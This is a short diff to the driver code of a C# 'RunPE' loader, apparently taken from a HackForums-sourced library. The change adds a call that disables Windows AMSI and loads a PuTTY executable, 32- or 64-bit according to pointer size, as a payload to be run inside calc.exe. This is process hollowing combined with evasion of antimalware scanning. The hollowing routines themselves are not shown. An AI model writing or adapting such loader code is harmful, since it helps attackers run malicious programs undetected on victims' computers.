@@ -1,5 +1,6 @@
 ﻿using HackForums.gigajew;
 using System;
+using System.Diagnostics;
 using System.IO;
 using System.Reflection;
 using System.Runtime.InteropServices;
@@ -12,13 +13,20 @@ namespace RunPE
 
         public static int Main(string[] args)
         {
-            byte[] payload_amd64 = File.ReadAllBytes("putty64.exe");
-            string calculator_amd64 = "C:\\Windows\\system32\\calc.exe";
+            WinXComponents.DisableAMSI();
+
+            string payloadFileName = "putty.exe";
+            if(IntPtr.Size * 8 == 64)
+            {
+                payloadFileName = "putty64.exe";
+            }
+            var payload = File.ReadAllBytes(payloadFileName);
+            string calculator = "C:\\Windows\\system32\\calc.exe";
             string[] arguments = null;
             bool hidden = false;
 
-            WinXParameters parameters = WinXParameters.Create(payload_amd64, calculator_amd64, hidden, arguments);
-            WinX64.Start(parameters);
+            WinXParameters parameters = WinXParameters.Create(payload, calculator, hidden, arguments);
+            WinX86.Start(parameters);
 
 
 
